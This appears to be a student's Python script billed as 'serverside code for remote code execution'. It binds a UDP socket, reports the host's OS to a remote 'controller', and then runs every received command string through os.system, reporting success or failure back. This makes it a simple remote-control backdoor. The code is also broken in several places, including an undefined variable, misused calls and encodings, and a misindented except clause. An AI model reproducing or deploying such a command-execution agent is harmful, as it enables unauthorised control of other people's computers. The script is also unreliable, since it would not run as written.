#this is serverside code for remote code execution(RCE)
#first let's import required modules to complete this project
import os,sys,socket,time,subprocess
''' we have imported os for operating system tasks since, out project is to controll the other computer so,that means of controll of os
imported socket because the idea of RCE will be completed with socket programming only
    socket programming is a way of connecting two nodes on a network to communicate with each other
imported time to set time limit while exectution of code
imported  sub process to obtain input/output/error pipes as well as the exit codes of various commands
    subprocesses module in python is used to run new applications or programmes through python code by creating new processes.
    it alos helps in obtaining input/output/error pipes as well as the exit codes of various commands'''
#we are using UDP network model  socket
s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
#ipaddress of mahesh laptop
myip=("192.168.43.129")
#for error handlng purpose we have to use try and except block
try:
    #binding socket to connect
    s.bind(address)
    #target os type
    os.type=sys.platform #to know about the  os type of any computer
    data=s.recv(20)
    print(data)
    #sending os details to the controller
    s.sendto(os_type('ansii'),data(1))
    while True:
        clrdata=s.recvfrom(100)#receive data from the controller
        #validating instructions
        cmd=clrdata(0).decode('ansii')
        check=os.system(cmd)
        if check==0:
            print("instruction found.")
            s.sendto("instruction found and execute".encode('ansii'),clrdata(1))
        else:
            print("instruction not found.")
            s.sendto("instruction not found".encode('ansii'),clrdata(1))
    except:
        print("socket binding failed")
        time.sleep(1)
        print("ok check port number")
        